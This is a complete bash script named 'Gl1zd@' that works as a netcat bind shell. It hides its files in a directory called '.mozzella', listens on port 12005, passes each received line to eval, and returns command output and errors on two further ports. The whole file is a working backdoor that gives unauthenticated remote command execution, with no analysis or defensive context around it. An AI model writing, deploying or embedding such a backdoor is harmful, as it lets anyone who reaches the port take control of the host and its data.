#!/bin/bash

echo "[S] Gl1zd@ running!"
inputport=12005
outputport=12006
errorport=12007
dir="/home/$USER/.mozzella"
outputfile="$dir/gl1zd@.out"
errorfile="$dir/gl1zd@.err"

echo "[S] Input port: $inputport"
echo "[S] Output port: $outputport"
echo "[S] Error port: $errorport"

echo -n "[S] Creating $dir..."
mkdir "$dir"
echo "Done."

echo -n "[S] Creating $outputfile as output file... "
touch "$outputfile"
echo "Done."

echo -n "[S] Creating $errorfile as error file... "
touch "$errorfile"
echo "Done."


echo "[S] Listening on port: $inputport"
while :
do
	while read -r command; do

		echo "[S]Received commad: $command ." 
		echo -e "[S] Command '$command' output: \n" >"$outputfile"
		echo -e "[S] Command '$command' error:\n" >"$errorfile"
		echo "[S] Out & err files set up."
		echo -n "[S] Executing command... "
		eval "$command" >"$outputfile" 2>"$errorfile"
		echo "Done"
		echo -n "[S] Sending feedback.."
		cat "$outputfile" | nc -l -p "$outputport" &
		cat "$errorfile" | nc -l -p "$errorport" & 
		sleep 2 && pkill -P $$
		echo "Done"
	done < <(nc -l -p "$inputport")
done

echo "[S] Script ended!"


